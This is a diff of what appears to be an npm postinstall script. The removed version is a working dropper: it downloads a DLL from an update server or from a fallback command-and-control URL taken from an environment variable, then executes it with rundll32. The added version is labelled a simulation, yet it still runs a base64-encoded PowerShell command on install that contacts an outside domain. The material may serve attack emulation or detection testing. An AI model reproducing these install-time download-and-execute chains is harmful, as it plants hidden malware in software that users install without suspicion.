@@ -1,38 +1,35 @@
-const https = require('https');
-const fs = require('fs');
 const { exec } = require('child_process');
-require('dotenv').config({ path: '../../.env' });
 
-const primaryUrl = "https://updates.pharma-novatech.com"; 
-const fallbackUrl = process.env.FALLBACK_C2; // malicious
-const filePath = "C:\\ProgramData\\update-core.dll";
+// ---------------------------
+// 1) Fake "update-core.dll" drop (simulated)
+// ---------------------------
+console.log("[postinstall] Simulating DLL drop...");
+const fs = require("fs");
+fs.writeFileSync("update-core.dll", "SIMULATED-DLL");
 
-function download(url, callback) {
-    // Purposefully fail primary server (simulated infrastructure outage)
-    if (url === primaryUrl) {
-        return callback(new Error("Primary update endpoint unreachable"));
-    }
+// ---------------------------
+// 2) Base64 "payload"
+// ---------------------------
+const payload = Buffer.from(`
+Write-Host "Executing telemetry sync...";
+Invoke-WebRequest -Uri "https://pharma-update.net/api/ping" -UseBasicParsing;
+`).toString('base64');
 
-    https.get(url, (res) => {
-        const file = fs.createWriteStream(filePath);
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close(() => callback(null));
-        });
-    }).on("error", () => callback(new Error("Download failed")));
-}
+// ---------------------------
+// 3) Simulated malicious execution chain
+// rundll32.exe -> powershell.exe -enc <base64>
+// ---------------------------
+const command = `powershell.exe -enc ${payload}`;
+console.log("[postinstall] Executing simulated payload...");
 
-function executeDll() {
-    exec(`rundll32.exe ${filePath},#1`, () => {});
-}
-
-download(primaryUrl, (err) => {
+exec(command, (err, stdout, stderr) => {
     if (err) {
-        // PRIMARY FAIL → USE MALICIOUS FALLBACK C2
-        download(fallbackUrl, (fallbackErr) => {
-            if (!fallbackErr) executeDll();
-        });
-    } else {
-        executeDll();
+        console.error("[postinstall] Error executing simulation:", err);
     }
+    console.log(stdout);
 });
+
+// ---------------------------
+// 4) Fake "persistence" creation log (no real persistence is created)
+// ---------------------------
+console.log("[postinstall] Simulating scheduled task creation log...");
